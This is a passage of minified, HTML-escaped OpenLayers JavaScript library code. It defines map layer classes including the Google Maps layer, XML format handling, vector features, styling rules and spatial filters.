f=this.getMapObjectCenter(),f=this.getOLLonLatFromMapObjectLonLat(f),g=this.getMapObjectZoom(),g=this.getOLZoomFromMapObjectZoom(g);d.equals(f)&amp;&amp;e==g||(!b&amp;&amp;f&amp;&amp;this.dragPanMapObject&amp;&amp;this.smoothDragPan?(e=this.map.getViewPortPxFromLonLat(f),d=this.map.getViewPortPxFromLonLat(d),this.dragPanMapObject(d.x-e.x,e.y-d.y)):(d=this.getMapObjectLonLatFromOLLonLat(d),e=this.getMapObjectZoomFromOLZoom(e),this.setMapObjectCenter(d, e,c)))}}},getLonLatFromViewPortPx:function(a){var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectPixelFromOLPixel(a),a=this.getMapObjectLonLatFromMapObjectPixel(a),b=this.getOLLonLatFromMapObjectLonLat(a));return b},getViewPortPxFromLonLat:function(a){var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectLonLatFromOLLonLat(a),a=this.getMapObjectPixelFromMapObjectLonLat(a),b=this.getOLPixelFromMapObjectPixel(a));return b},getOLLonLatFromMapObjectLonLat:function(a){var b= null;null!=a&amp;&amp;(b=this.getLongitudeFromMapObjectLonLat(a),a=this.getLatitudeFromMapObjectLonLat(a),b=new OpenLayers.LonLat(b,a));return b},getMapObjectLonLatFromOLLonLat:function(a){var b=null;null!=a&amp;&amp;(b=this.getMapObjectLonLatFromLonLat(a.lon,a.lat));return b},getOLPixelFromMapObjectPixel:function(a){var b=null;null!=a&amp;&amp;(b=this.getXFromMapObjectPixel(a),a=this.getYFromMapObjectPixel(a),b=new OpenLayers.Pixel(b,a));return b},getMapObjectPixelFromOLPixel:function(a){var b=null;null!=a&amp;&amp;(b=this.getMapObjectPixelFromXY(a.x, a.y));return b},CLASS_NAME:"OpenLayers.Layer.EventPane"});OpenLayers.Layer.FixedZoomLevels=OpenLayers.Class({initialize:function(){},initResolutions:function(){for(var a=["minZoomLevel","maxZoomLevel","numZoomLevels"],b=0,c=a.length;b&lt;c;b++){var d=a[b];this[d]=null!=this.options[d]?this.options[d]:this.map[d]}if(null==this.minZoomLevel||this.minZoomLevel&lt;this.MIN_ZOOM_LEVEL)this.minZoomLevel=this.MIN_ZOOM_LEVEL;a=this.MAX_ZOOM_LEVEL-this.minZoomLevel+1;b=null==this.options.numZoomLevels&amp;&amp;null!=this.options.maxZoomLevel||null==this.numZoomLevels&amp;&amp;null!=this.maxZoomLevel? this.maxZoomLevel-this.minZoomLevel+1:this.numZoomLevels;this.numZoomLevels=null!=b?Math.min(b,a):a;this.maxZoomLevel=this.minZoomLevel+this.numZoomLevels-1;if(null!=this.RESOLUTIONS){a=0;this.resolutions=[];for(b=this.minZoomLevel;b&lt;=this.maxZoomLevel;b++)this.resolutions[a++]=this.RESOLUTIONS[b];this.maxResolution=this.resolutions[0];this.minResolution=this.resolutions[this.resolutions.length-1]}},getResolution:function(){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getResolution.apply(this, arguments);var a=null,b=this.map.getSize(),c=this.getExtent();null!=b&amp;&amp;null!=c&amp;&amp;(a=Math.max(c.getWidth()/b.w,c.getHeight()/b.h));return a},getExtent:function(){var a=this.map.getSize(),b=this.getLonLatFromViewPortPx({x:0,y:0}),a=this.getLonLatFromViewPortPx({x:a.w,y:a.h});return null!=b&amp;&amp;null!=a?new OpenLayers.Bounds(b.lon,a.lat,a.lon,b.lat):null},getZoomForResolution:function(a){if(null!=this.resolutions)return OpenLayers.Layer.prototype.getZoomForResolution.apply(this,arguments);var b=OpenLayers.Layer.prototype.getExtent.apply(this, []);return this.getZoomForExtent(b)},getOLZoomFromMapObjectZoom:function(a){var b=null;null!=a&amp;&amp;(b=a-this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.map.baseLayer.getZoomForResolution(this.getResolutionForZoom(b))));return b},getMapObjectZoomFromOLZoom:function(a){var b=null;null!=a&amp;&amp;(b=a+this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.getZoomForResolution(this.map.baseLayer.getResolutionForZoom(b))));return b},CLASS_NAME:"OpenLayers.Layer.FixedZoomLevels"});OpenLayers.Layer.Google=OpenLayers.Class(OpenLayers.Layer.EventPane,OpenLayers.Layer.FixedZoomLevels,{MIN_ZOOM_LEVEL:0,MAX_ZOOM_LEVEL:21,RESOLUTIONS:[1.40625,0.703125,0.3515625,0.17578125,0.087890625,0.0439453125,0.02197265625,0.010986328125,0.0054931640625,0.00274658203125,0.001373291015625,6.866455078125E-4,3.4332275390625E-4,1.71661376953125E-4,8.58306884765625E-5,4.291534423828125E-5,2.145767211914062E-5,1.072883605957031E-5,5.36441802978515E-6,2.68220901489257E-6,1.341104507446289E-6,6.705522537231445E-7], type:null,wrapDateLine:!0,sphericalMercator:!1,version:null,initialize:function(a,b){b=b||{};b.version||(b.version="function"===typeof GMap2?"2":"3");var c=OpenLayers.Layer.Google["v"+b.version.replace(/\./g,"_")];if(c)OpenLayers.Util.applyDefaults(b,c);else throw"Unsupported Google Maps API version: "+b.version;OpenLayers.Util.applyDefaults(b,c.DEFAULTS);b.maxExtent&amp;&amp;(b.maxExtent=b.maxExtent.clone());OpenLayers.Layer.EventPane.prototype.initialize.apply(this,[a,b]);OpenLayers.Layer.FixedZoomLevels.prototype.initialize.apply(this, [a,b]);this.sphericalMercator&amp;&amp;(OpenLayers.Util.extend(this,OpenLayers.Layer.SphericalMercator),this.initMercatorParameters())},clone:function(){return new OpenLayers.Layer.Google(this.name,this.getOptions())},setVisibility:function(a){var b=null==this.opacity?1:this.opacity;OpenLayers.Layer.EventPane.prototype.setVisibility.apply(this,arguments);this.setOpacity(b)},display:function(a){this._dragging||this.setGMapVisibility(a);OpenLayers.Layer.EventPane.prototype.display.apply(this,arguments)},moveTo:function(a, b,c){this._dragging=c;OpenLayers.Layer.EventPane.prototype.moveTo.apply(this,arguments);delete this._dragging},setOpacity:function(a){a!==this.opacity&amp;&amp;(null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"opacity"}),this.opacity=a);if(this.getVisibility()){var b=this.getMapContainer();OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,a)}},destroy:function(){if(this.map){this.setGMapVisibility(!1);var a=OpenLayers.Layer.Google.cache[this.map.id];a&amp;&amp;1>=a.count&amp;&amp; this.removeGMapElements()}OpenLayers.Layer.EventPane.prototype.destroy.apply(this,arguments)},removeGMapElements:function(){var a=OpenLayers.Layer.Google.cache[this.map.id];if(a){var b=this.mapObject&amp;&amp;this.getMapContainer();b&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(b=a.termsOfUse)&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(a=a.poweredBy)&amp;&amp;a.parentNode&amp;&amp;a.parentNode.removeChild(a);this.mapObject&amp;&amp;(window.google&amp;&amp;google.maps&amp;&amp;google.maps.event&amp;&amp;google.maps.event.clearListeners)&amp;&amp;google.maps.event.clearListeners(this.mapObject, "tilesloaded")}},removeMap:function(a){this.visibility&amp;&amp;this.mapObject&amp;&amp;this.setGMapVisibility(!1);var b=OpenLayers.Layer.Google.cache[a.id];b&amp;&amp;(1>=b.count?(this.removeGMapElements(),delete OpenLayers.Layer.Google.cache[a.id]):--b.count);delete this.termsOfUse;delete this.poweredBy;delete this.mapObject;delete this.dragObject;OpenLayers.Layer.EventPane.prototype.removeMap.apply(this,arguments)},getOLBoundsFromMapObjectBounds:function(a){var b=null;null!=a&amp;&amp;(b=a.getSouthWest(),a=a.getNorthEast(),this.sphericalMercator? (b=this.forwardMercator(b.lng(),b.lat()),a=this.forwardMercator(a.lng(),a.lat())):(b=new OpenLayers.LonLat(b.lng(),b.lat()),a=new OpenLayers.LonLat(a.lng(),a.lat())),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat));return b},getWarningHTML:function(){return OpenLayers.i18n("googleWarning")},getMapObjectCenter:function(){return this.mapObject.getCenter()},getMapObjectZoom:function(){return this.mapObject.getZoom()},getLongitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(), a.lat()).lon:a.lng()},getLatitudeFromMapObjectLonLat:function(a){return this.sphericalMercator?this.forwardMercator(a.lng(),a.lat()).lat:a.lat()},getXFromMapObjectPixel:function(a){return a.x},getYFromMapObjectPixel:function(a){return a.y},CLASS_NAME:"OpenLayers.Layer.Google"});OpenLayers.Layer.Google.cache={}; OpenLayers.Layer.Google.v2={termsOfUse:null,poweredBy:null,dragObject:null,loadMapObject:function(){this.type||(this.type=G_NORMAL_MAP);var a,b,c,d=OpenLayers.Layer.Google.cache[this.map.id];if(d)a=d.mapObject,b=d.termsOfUse,c=d.poweredBy,++d.count;else{var d=this.map.viewPortDiv,e=document.createElement("div");e.id=this.map.id+"_GMap2Container";e.style.position="absolute";e.style.width="100%";e.style.height="100%";d.appendChild(e);try{a=new GMap2(e),b=e.lastChild,d.appendChild(b),b.style.zIndex= "1100",b.style.right="",b.style.bottom="",b.className="olLayerGoogleCopyright",c=e.lastChild,d.appendChild(c),c.style.zIndex="1100",c.style.right="",c.style.bottom="",c.className="olLayerGooglePoweredBy gmnoprint"}catch(f){throw f;}OpenLayers.Layer.Google.cache[this.map.id]={mapObject:a,termsOfUse:b,poweredBy:c,count:1}}this.mapObject=a;this.termsOfUse=b;this.poweredBy=c;-1===OpenLayers.Util.indexOf(this.mapObject.getMapTypes(),this.type)&amp;&amp;this.mapObject.addMapType(this.type);"function"==typeof a.getDragObject? this.dragObject=a.getDragObject():this.dragPanMapObject=null;!1===this.isBaseLayer&amp;&amp;this.setGMapVisibility("none"!==this.div.style.display)},onMapResize:function(){if(this.visibility&amp;&amp;this.mapObject.isLoaded())this.mapObject.checkResize();else{if(!this._resized)var a=this,b=GEvent.addListener(this.mapObject,"load",function(){GEvent.removeListener(b);delete a._resized;a.mapObject.checkResize();a.moveTo(a.map.getCenter(),a.map.getZoom())});this._resized=!0}},setGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id]; if(b){var c=this.mapObject.getContainer();!0===a?(this.mapObject.setMapType(this.type),c.style.display="",this.termsOfUse.style.left="",this.termsOfUse.style.display="",this.poweredBy.style.display="",b.displayed=this.id):(b.displayed===this.id&amp;&amp;delete b.displayed,b.displayed||(c.style.display="none",this.termsOfUse.style.display="none",this.termsOfUse.style.left="-9999px",this.poweredBy.style.display="none"))}},getMapContainer:function(){return this.mapObject.getContainer()},getMapObjectBoundsFromOLBounds:function(a){var b= null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,a.right):new OpenLayers.LonLat(a.top,a.right),b=new GLatLngBounds(new GLatLng(b.lat,b.lon),new GLatLng(a.lat,a.lon)));return b},setMapObjectCenter:function(a,b){this.mapObject.setCenter(a,b)},dragPanMapObject:function(a,b){this.dragObject.moveBy(new GSize(-a,b))},getMapObjectLonLatFromMapObjectPixel:function(a){return this.mapObject.fromContainerPixelToLatLng(a)}, getMapObjectPixelFromMapObjectLonLat:function(a){return this.mapObject.fromLatLngToContainerPixel(a)},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new GLatLng(c.lat,c.lon)):c=new GLatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new GPoint(a,b)}};OpenLayers.Format.XML=OpenLayers.Class(OpenLayers.Format,{namespaces:null,namespaceAlias:null,defaultPrefix:null,readers:{},writers:{},xmldom:null,initialize:function(a){window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM"));OpenLayers.Format.prototype.initialize.apply(this,[a]);this.namespaces=OpenLayers.Util.extend({},this.namespaces);this.namespaceAlias={};for(var b in this.namespaces)this.namespaceAlias[this.namespaces[b]]=b},destroy:function(){this.xmldom=null;OpenLayers.Format.prototype.destroy.apply(this, arguments)},setNamespace:function(a,b){this.namespaces[a]=b;this.namespaceAlias[b]=a},read:function(a){var b=a.indexOf("&lt;");0&lt;b&amp;&amp;(a=a.substring(b));b=OpenLayers.Util.Try(OpenLayers.Function.bind(function(){var b;b=window.ActiveXObject&amp;&amp;!this.xmldom?new ActiveXObject("Microsoft.XMLDOM"):this.xmldom;b.loadXML(a);return b},this),function(){return(new DOMParser).parseFromString(a,"text/xml")},function(){var b=new XMLHttpRequest;b.open("GET","data:text/xml;charset=utf-8,"+encodeURIComponent(a),!1);b.overrideMimeType&amp;&amp; b.overrideMimeType("text/xml");b.send(null);return b.responseXML});this.keepData&amp;&amp;(this.data=b);return b},write:function(a){if(this.xmldom)a=a.xml;else{var b=new XMLSerializer;if(1==a.nodeType){var c=document.implementation.createDocument("","",null);c.importNode&amp;&amp;(a=c.importNode(a,!0));c.appendChild(a);a=b.serializeToString(c)}else a=b.serializeToString(a)}return a},createElementNS:function(a,b){return this.xmldom?"string"==typeof a?this.xmldom.createNode(1,b,a):this.xmldom.createNode(1,b,""):document.createElementNS(a, b)},createDocumentFragment:function(){return this.xmldom?this.xmldom.createDocumentFragment():document.createDocumentFragment()},createTextNode:function(a){"string"!==typeof a&amp;&amp;(a=String(a));return this.xmldom?this.xmldom.createTextNode(a):document.createTextNode(a)},getElementsByTagNameNS:function(a,b,c){var d=[];if(a.getElementsByTagNameNS)d=a.getElementsByTagNameNS(b,c);else{a=a.getElementsByTagName("*");for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],f=e.prefix?e.prefix+":"+c:c,"*"==c||f==e.nodeName)"*"!= b&amp;&amp;b!=e.namespaceURI||d.push(e)}return d},getAttributeNodeNS:function(a,b,c){var d=null;if(a.getAttributeNodeNS)d=a.getAttributeNodeNS(b,c);else{a=a.attributes;for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],e.namespaceURI==b&amp;&amp;(f=e.prefix?e.prefix+":"+c:c,f==e.nodeName)){d=e;break}}return d},getAttributeNS:function(a,b,c){var d="";if(a.getAttributeNS)d=a.getAttributeNS(b,c)||"";else if(a=this.getAttributeNodeNS(a,b,c))d=a.nodeValue;return d},getChildValue:function(a,b){var c=b||"";if(a)for(var d=a.firstChild;d;d= d.nextSibling)switch(d.nodeType){case 3:case 4:c+=d.nodeValue}return c},isSimpleContent:function(a){var b=!0;for(a=a.firstChild;a;a=a.nextSibling)if(1===a.nodeType){b=!1;break}return b},contentType:function(a){var b=!1,c=!1,d=OpenLayers.Format.XML.CONTENT_TYPE.EMPTY;for(a=a.firstChild;a;a=a.nextSibling){switch(a.nodeType){case 1:c=!0;break;case 8:break;default:b=!0}if(c&amp;&amp;b)break}if(c&amp;&amp;b)d=OpenLayers.Format.XML.CONTENT_TYPE.MIXED;else{if(c)return OpenLayers.Format.XML.CONTENT_TYPE.COMPLEX;if(b)return OpenLayers.Format.XML.CONTENT_TYPE.SIMPLE}return d}, hasAttributeNS:function(a,b,c){var d=!1;return d=a.hasAttributeNS?a.hasAttributeNS(b,c):!!this.getAttributeNodeNS(a,b,c)},setAttributeNS:function(a,b,c,d){if(a.setAttributeNS)a.setAttributeNS(b,c,d);else if(this.xmldom)b?(b=a.ownerDocument.createNode(2,c,b),b.nodeValue=d,a.setAttributeNode(b)):a.setAttribute(c,d);else throw"setAttributeNS not implemented";},createElementNSPlus:function(a,b){b=b||{};var c=b.uri||this.namespaces[b.prefix];c||(c=a.indexOf(":"),c=this.namespaces[a.substring(0,c)]);c|| (c=this.namespaces[this.defaultPrefix]);c=this.createElementNS(c,a);b.attributes&amp;&amp;this.setAttributes(c,b.attributes);var d=b.value;null!=d&amp;&amp;c.appendChild(this.createTextNode(d));return c},setAttributes:function(a,b){var c,d,e;for(e in b)null!=b[e]&amp;&amp;b[e].toString&amp;&amp;(c=b[e].toString(),d=this.namespaces[e.substring(0,e.indexOf(":"))]||null,this.setAttributeNS(a,d,e,c))},readNode:function(a,b){b||(b={});var c=this.readers[a.namespaceURI?this.namespaceAlias[a.namespaceURI]:this.defaultPrefix];if(c){var d= a.localName||a.nodeName.split(":").pop();(c=c[d]||c["*"])&amp;&amp;c.apply(this,[a,b])}return b},readChildNodes:function(a,b){b||(b={});for(var c=a.childNodes,d,e=0,f=c.length;e&lt;f;++e)d=c[e],1==d.nodeType&amp;&amp;this.readNode(d,b);return b},writeNode:function(a,b,c){var d,e=a.indexOf(":");0&lt;e?(d=a.substring(0,e),a=a.substring(e+1)):d=c?this.namespaceAlias[c.namespaceURI]:this.defaultPrefix;b=this.writers[d][a].apply(this,[b]);c&amp;&amp;c.appendChild(b);return b},getChildEl:function(a,b,c){return a&amp;&amp;this.getThisOrNextEl(a.firstChild, b,c)},getNextEl:function(a,b,c){return a&amp;&amp;this.getThisOrNextEl(a.nextSibling,b,c)},getThisOrNextEl:function(a,b,c){a:for(;a;a=a.nextSibling)switch(a.nodeType){case 1:if(!(b&amp;&amp;b!==(a.localName||a.nodeName.split(":").pop())||c&amp;&amp;c!==a.namespaceURI))break a;a=null;break a;case 3:if(/^\s*$/.test(a.nodeValue))break;case 4:case 6:case 12:case 10:case 11:a=null;break a}return a||null},lookupNamespaceURI:function(a,b){var c=null;if(a)if(a.lookupNamespaceURI)c=a.lookupNamespaceURI(b);else a:switch(a.nodeType){case 1:if(null!== a.namespaceURI&amp;&amp;a.prefix===b){c=a.namespaceURI;break a}if(c=a.attributes.length)for(var d,e=0;e&lt;c;++e)if(d=a.attributes[e],"xmlns"===d.prefix&amp;&amp;d.name==="xmlns:"+b){c=d.value||null;break a}else if("xmlns"===d.name&amp;&amp;null===b){c=d.value||null;break a}c=this.lookupNamespaceURI(a.parentNode,b);break a;case 2:c=this.lookupNamespaceURI(a.ownerElement,b);break a;case 9:c=this.lookupNamespaceURI(a.documentElement,b);break a;case 6:case 12:case 10:case 11:break a;default:c=this.lookupNamespaceURI(a.parentNode, b)}return c},getXMLDoc:function(){OpenLayers.Format.XML.document||this.xmldom||(document.implementation&amp;&amp;document.implementation.createDocument?OpenLayers.Format.XML.document=document.implementation.createDocument("","",null):!this.xmldom&amp;&amp;window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM")));return OpenLayers.Format.XML.document||this.xmldom},CLASS_NAME:"OpenLayers.Format.XML"});OpenLayers.Format.XML.CONTENT_TYPE={EMPTY:0,SIMPLE:1,COMPLEX:2,MIXED:3}; OpenLayers.Format.XML.lookupNamespaceURI=OpenLayers.Function.bind(OpenLayers.Format.XML.prototype.lookupNamespaceURI,OpenLayers.Format.XML.prototype);OpenLayers.Format.XML.document=null;OpenLayers.Format.WFST=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.WFST.DEFAULTS);var b=OpenLayers.Format.WFST["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported WFST version: "+a.version;return new b(a)};OpenLayers.Format.WFST.DEFAULTS={version:"1.0.0"};OpenLayers.Feature=OpenLayers.Class({layer:null,id:null,lonlat:null,data:null,marker:null,popupClass:null,popup:null,initialize:function(a,b,c){this.layer=a;this.lonlat=b;this.data=null!=c?c:{};this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;null!=this.popup&amp;&amp;this.layer.map.removePopup(this.popup);null!=this.layer&amp;&amp;null!=this.marker&amp;&amp;this.layer.removeMarker(this.marker);this.data=this.lonlat=this.id=this.layer=null;null!=this.marker&amp;&amp; (this.destroyMarker(this.marker),this.marker=null);null!=this.popup&amp;&amp;(this.destroyPopup(this.popup),this.popup=null)},onScreen:function(){var a=!1;null!=this.layer&amp;&amp;null!=this.layer.map&amp;&amp;(a=this.layer.map.getExtent().containsLonLat(this.lonlat));return a},createMarker:function(){null!=this.lonlat&amp;&amp;(this.marker=new OpenLayers.Marker(this.lonlat,this.data.icon));return this.marker},destroyMarker:function(){this.marker.destroy()},createPopup:function(a){null!=this.lonlat&amp;&amp;(this.popup||(this.popup=new (this.popupClass? this.popupClass:OpenLayers.Popup.Anchored)(this.id+"_popup",this.lonlat,this.data.popupSize,this.data.popupContentHTML,this.marker?this.marker.icon:null,a)),null!=this.data.overflow&amp;&amp;(this.popup.contentDiv.style.overflow=this.data.overflow),this.popup.feature=this);return this.popup},destroyPopup:function(){this.popup&amp;&amp;(this.popup.feature=null,this.popup.destroy(),this.popup=null)},CLASS_NAME:"OpenLayers.Feature"});OpenLayers.State={UNKNOWN:"Unknown",INSERT:"Insert",UPDATE:"Update",DELETE:"Delete"}; OpenLayers.Feature.Vector=OpenLayers.Class(OpenLayers.Feature,{fid:null,geometry:null,attributes:null,bounds:null,state:null,style:null,url:null,renderIntent:"default",modified:null,initialize:function(a,b,c){OpenLayers.Feature.prototype.initialize.apply(this,[null,null,b]);this.lonlat=null;this.geometry=a?a:null;this.state=null;this.attributes={};b&amp;&amp;(this.attributes=OpenLayers.Util.extend(this.attributes,b));this.style=c?c:null},destroy:function(){this.layer&amp;&amp;(this.layer.removeFeatures(this),this.layer= null);this.modified=this.geometry=null;OpenLayers.Feature.prototype.destroy.apply(this,arguments)},clone:function(){return new OpenLayers.Feature.Vector(this.geometry?this.geometry.clone():null,this.attributes,this.style)},onScreen:function(a){var b=!1;this.layer&amp;&amp;this.layer.map&amp;&amp;(b=this.layer.map.getExtent(),a?(a=this.geometry.getBounds(),b=b.intersectsBounds(a)):b=b.toGeometry().intersects(this.geometry));return b},getVisibility:function(){return!(this.style&amp;&amp;"none"==this.style.display||!this.layer|| this.layer&amp;&amp;this.layer.styleMap&amp;&amp;"none"==this.layer.styleMap.createSymbolizer(this,this.renderIntent).display||this.layer&amp;&amp;!this.layer.getVisibility())},createMarker:function(){return null},destroyMarker:function(){},createPopup:function(){return null},atPoint:function(a,b,c){var d=!1;this.geometry&amp;&amp;(d=this.geometry.atPoint(a,b,c));return d},destroyPopup:function(){},move:function(a){if(this.layer&amp;&amp;this.geometry.move){a="OpenLayers.LonLat"==a.CLASS_NAME?this.layer.getViewPortPxFromLonLat(a):a;var b= this.layer.getViewPortPxFromLonLat(this.geometry.getBounds().getCenterLonLat()),c=this.layer.map.getResolution();this.geometry.move(c*(a.x-b.x),c*(b.y-a.y));this.layer.drawFeature(this);return b}},toState:function(a){if(a==OpenLayers.State.UPDATE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.DELETE:this.state=a}else if(a==OpenLayers.State.INSERT)switch(this.state){case OpenLayers.State.UNKNOWN:break;default:this.state=a}else if(a==OpenLayers.State.DELETE)switch(this.state){case OpenLayers.State.UNKNOWN:case OpenLayers.State.UPDATE:this.state= a}else a==OpenLayers.State.UNKNOWN&amp;&amp;(this.state=a)},CLASS_NAME:"OpenLayers.Feature.Vector"}); OpenLayers.Feature.Vector.style={"default":{fillColor:"#ee9900",fillOpacity:0.4,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#ee9900",strokeOpacity:1,strokeWidth:1,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},select:{fillColor:"blue",fillOpacity:0.4, hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"blue",strokeOpacity:1,strokeWidth:2,strokeLinecap:"round",strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"pointer",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},temporary:{fillColor:"#66cccc",fillOpacity:0.2,hoverFillColor:"white",hoverFillOpacity:0.8,strokeColor:"#66cccc",strokeOpacity:1, strokeLinecap:"round",strokeWidth:2,strokeDashstyle:"solid",hoverStrokeColor:"red",hoverStrokeOpacity:1,hoverStrokeWidth:0.2,pointRadius:6,hoverPointRadius:1,hoverPointUnit:"%",pointerEvents:"visiblePainted",cursor:"inherit",fontColor:"#000000",labelAlign:"cm",labelOutlineColor:"white",labelOutlineWidth:3},"delete":{display:"none"}};OpenLayers.Style=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,context:null,defaultStyle:null,defaultsPerSymbolizer:!1,propertyStyles:null,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.rules=[];b&amp;&amp;b.rules&amp;&amp;this.addRules(b.rules);this.setDefaultStyle(a||OpenLayers.Feature.Vector.style["default"]);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy(), this.rules[a]=null;this.defaultStyle=this.rules=null},createSymbolizer:function(a){for(var b=this.defaultsPerSymbolizer?{}:this.createLiterals(OpenLayers.Util.extend({},this.defaultStyle),a),c=this.rules,d,e=[],f=!1,g=0,h=c.length;g&lt;h;g++)d=c[g],d.evaluate(a)&amp;&amp;(d instanceof OpenLayers.Rule&amp;&amp;d.elseFilter?e.push(d):(f=!0,this.applySymbolizer(d,b,a)));if(!1==f&amp;&amp;0&lt;e.length)for(f=!0,g=0,h=e.length;g&lt;h;g++)this.applySymbolizer(e[g],b,a);0&lt;c.length&amp;&amp;!1==f&amp;&amp;(b.display="none");null!=b.label&amp;&amp;"string"!==typeof b.label&amp;&amp; (b.label=String(b.label));return b},applySymbolizer:function(a,b,c){var d=c.geometry?this.getSymbolizerPrefix(c.geometry):OpenLayers.Style.SYMBOLIZER_PREFIXES[0];a=a.symbolizer[d]||a.symbolizer;!0===this.defaultsPerSymbolizer&amp;&amp;(d=this.defaultStyle,OpenLayers.Util.applyDefaults(a,{pointRadius:d.pointRadius}),!0!==a.stroke&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{strokeWidth:d.strokeWidth,strokeColor:d.strokeColor,strokeOpacity:d.strokeOpacity,strokeDashstyle:d.strokeDashstyle,strokeLinecap:d.strokeLinecap}), !0!==a.fill&amp;&amp;!0!==a.graphic||OpenLayers.Util.applyDefaults(a,{fillColor:d.fillColor,fillOpacity:d.fillOpacity}),!0===a.graphic&amp;&amp;OpenLayers.Util.applyDefaults(a,{pointRadius:this.defaultStyle.pointRadius,externalGraphic:this.defaultStyle.externalGraphic,graphicName:this.defaultStyle.graphicName,graphicOpacity:this.defaultStyle.graphicOpacity,graphicWidth:this.defaultStyle.graphicWidth,graphicHeight:this.defaultStyle.graphicHeight,graphicXOffset:this.defaultStyle.graphicXOffset,graphicYOffset:this.defaultStyle.graphicYOffset})); return this.createLiterals(OpenLayers.Util.extend(b,a),c)},createLiterals:function(a,b){var c=OpenLayers.Util.extend({},b.attributes||b.data);OpenLayers.Util.extend(c,this.context);for(var d in this.propertyStyles)a[d]=OpenLayers.Style.createLiteral(a[d],c,b,d);return a},findPropertyStyles:function(){var a={};this.addPropertyStyles(a,this.defaultStyle);for(var b=this.rules,c,d,e=0,f=b.length;e&lt;f;e++){c=b[e].symbolizer;for(var g in c)if(d=c[g],"object"==typeof d)this.addPropertyStyles(a,d);else{this.addPropertyStyles(a, c);break}}return a},addPropertyStyles:function(a,b){var c,d;for(d in b)c=b[d],"string"==typeof c&amp;&amp;c.match(/\$\{\w+\}/)&amp;&amp;(a[d]=!0);return a},addRules:function(a){Array.prototype.push.apply(this.rules,a);this.propertyStyles=this.findPropertyStyles()},setDefaultStyle:function(a){this.defaultStyle=a;this.propertyStyles=this.findPropertyStyles()},getSymbolizerPrefix:function(a){for(var b=OpenLayers.Style.SYMBOLIZER_PREFIXES,c=0,d=b.length;c&lt;d;c++)if(-1!=a.CLASS_NAME.indexOf(b[c]))return b[c]},clone:function(){var a= OpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())}a.context=this.context&amp;&amp;OpenLayers.Util.extend({},this.context);b=OpenLayers.Util.extend({},this.defaultStyle);return new OpenLayers.Style(b,a)},CLASS_NAME:"OpenLayers.Style"});OpenLayers.Style.createLiteral=function(a,b,c,d){"string"==typeof a&amp;&amp;-1!=a.indexOf("${")&amp;&amp;(a=OpenLayers.String.format(a,b,[c,d]),a=isNaN(a)||!a?a:parseFloat(a));return a}; OpenLayers.Style.SYMBOLIZER_PREFIXES=["Point","Line","Polygon","Text","Raster"];OpenLayers.Filter=OpenLayers.Class({initialize:function(a){OpenLayers.Util.extend(this,a)},destroy:function(){},evaluate:function(a){return!0},clone:function(){return null},toString:function(){return OpenLayers.Format&amp;&amp;OpenLayers.Format.CQL?OpenLayers.Format.CQL.prototype.write(this):Object.prototype.toString.call(this)},CLASS_NAME:"OpenLayers.Filter"});OpenLayers.Filter.Spatial=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,distance:null,distanceUnits:null,evaluate:function(a){var b=!1;switch(this.type){case OpenLayers.Filter.Spatial.BBOX:case OpenLayers.Filter.Spatial.INTERSECTS:if(a.geometry){var c=this.value;"OpenLayers.Bounds"==this.value.CLASS_NAME&amp;&amp;(c=this.value.toGeometry());a.geometry.intersects(c)&amp;&amp;(b=!0)}break;default:throw Error("evaluate is not implemented for this filter type.");}return b},clone:function(){var a= OpenLayers.Util.applyDefaults({value:this.value&amp;&amp;this.value.clone&amp;&amp;this.value.clone()},this);return new 